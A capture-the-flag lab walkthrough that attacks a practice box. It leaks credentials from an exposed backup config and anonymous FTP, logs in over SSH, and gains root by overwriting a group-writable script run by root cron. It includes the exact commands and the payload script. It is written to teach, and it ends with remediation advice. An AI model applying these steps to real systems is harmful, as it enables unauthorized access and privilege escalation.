---
title: "Kebena Print & Packaging — Boot2Root"
author: "mr.p4rr0t"
tags:
  - "mr.p4rr0t"
  - "ctf"
  - "misc"
  - "bunabyte"
category: "misc"
platform: "BunaByte"
---

# Kebena Print & Packaging PLC — Walkthrough

> **Author:** mr.p4rr0t • **Tag:** `#mr.p4rr0t`

**Name:** Natnael Sisay
**ID:** CTC-1475-26
**Target:** 10.236.42.6
**My LHOST:** 10.236.42.30 (my tunnel address was 10.200.0.28/32)
**VPN:** buna-lab.conf (WireGuard)

**Flags**

| File | Flag |
|---|---|
| user.txt | `[REDACTED]` |
| root.txt | `[REDACTED]` |

**The story in one line:** the old 2019 site backup was left on the web
server, anonymous FTP pointed at it, it leaked the admin password, that
password logged me in over SSH, and a root cron job ran a script I could
write to — so I became root.

---

## Step 1 — Connect the VPN

The config is WireGuard, not OpenVPN.

```
sudo cp ~/Downloads/buna-lab.conf /etc/wireguard/buna-lab.conf
sudo wg-quick up buna-lab
sudo wg show buna-lab
```

Note: my first copy was stale. `wg show` said `0 B received` and there was
no handshake line at all, so the lab server was ignoring my key. I
re-downloaded the config from the lab portal, brought it up again, and the
handshake appeared. Check `received` is not zero before you continue.

```
ping -c 2 10.236.42.6        # works once the tunnel is live
```

## Step 2 — Port scan

```
nmap -Pn -p- -T4 --min-rate 1200 --max-retries 1 10.236.42.6
```

Result:

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Three ports. The task said something from before the migration was still
running — FTP with no real reason to be there is the suspect.

Later the whole web tree was swept with gobuster (57,012 requests,
`scans/web_gobuster.txt`). It found only the same three things the manual
check found: /backup, /index.html, /robots.txt. Nothing was hidden.

## Step 3 — Look at the website

```
curl -i http://10.236.42.6/
```

Static nginx page. It says "Intranet and file services are available
inside the office network."

```
curl http://10.236.42.6/robots.txt
```

```
User-agent: *
Disallow: /backup/
```

robots.txt is not a secret-hider — it is a signpost. It named the folder
I should look at.

```
curl -s http://10.236.42.6/backup/
```

Directory listing was on. Two files: `README.txt` and `web.config.bak`.

```
curl -s http://10.236.42.6/backup/README.txt
# old-site-2019.zip.part (incomplete)

curl -s http://10.236.42.6/backup/web.config.bak
# old intranet config - DO NOT DEPLOY
# [database]
# host = 10.0.4.12
# user = tsegaye
# password = Kebena#2019
```

Password found. This is the leftover from the migration.

## Step 4 — Anonymous FTP

```
curl -s --list-only -u anonymous:anonymous ftp://10.236.42.6/
# pub

curl -s -u anonymous:anonymous ftp://10.236.42.6/pub/handover-notes.txt
```

```
- Old site backups are still in /backup on the web server until the
  migration is done. Please remove afterwards.
- Day-to-day sysadmin: tsegaye
```

The handover note confirms the /backup path (this is what the user flag
name refers to) and names the sysadmin.

## Step 5 — SSH in and grab user.txt

```
ssh tsegaye@10.236.42.6        # password: Kebena#2019
```

```
id
uid=1000(tsegaye) gid=1000(tsegaye)

cat ~/user.txt
[REDACTED]
```

user flag done.

## Step 6 — Find the root path

```
ls -la ~/notes; cat ~/notes/todo.txt
```

```
TODO: move the nightly cleanup to the new scheduler.
Script lives in /opt/maintenance, runs every minute for now.
```

```
cat /etc/cron.d/kebena-cleanup
* * * * * root /bin/bash /opt/maintenance/cleanup.sh
```

```
ls -la /opt/maintenance/
-rwxrwxr-x 1 root tsegaye 97 cleanup.sh
```

That is the whole bug. A root cron job runs that script every minute, and
the script is group-writable by tsegaye — so I can write what root will
run.

`sudo` does not exist on the box, SUID list was all stock (`passwd`,
`mount`, `su`, ...), and there were no file capabilities. The cron script
was the way.

## Step 7 — Become root

Overwrite the script (I kept a copy of the original first):

```bash
cat > /opt/maintenance/cleanup.sh <<'EOF'
#!/bin/bash
find /tmp -type f -mtime +1 -delete 2>/dev/null
( id; echo '--- /root/root.txt ---'; cat /root/root.txt ) > /tmp/root_kebena.txt 2>&1
chmod 666 /tmp/root_kebena.txt 2>/dev/null
EOF
```

Wait up to a minute, then:

```
cat /tmp/root_kebena.txt
uid=0(root) gid=0(root) groups=0(root)
--- /root/root.txt ---
[REDACTED]
```

root flag done. I then restored the original cleanup.sh so the box was
left as found.

---

## Why it worked

1. A 2019 site backup folder was still published on the new web server,
   with directory listing on and a config file that still had the
   password in it.
2. The same password was still valid on the server.
3. A root cron job ran a script that a normal user could edit.

## How to fix it

- Delete the old backup folder from the live server. Do not keep
  pre-migration files on production.
- Turn off directory listing. Protect /backup with auth if it must stay.
- Never keep passwords in files. If you must, hash or use a secret
  manager.
- Give the cron script root ownership and `700` permissions, and put it
  in a root-owned folder. Better: run the cleanup as a service account or
  a systemd timer, not root cron.
- Do not run a script that a non-root user can write to.

## Files

- `scans/alltcp.txt` — nmap full TCP
- `scans/web_gobuster.txt` — web content scan
- `loot/web.config.bak`, `loot/handover-notes.txt`, `loot/enum.txt`, `loot/exploit.log`
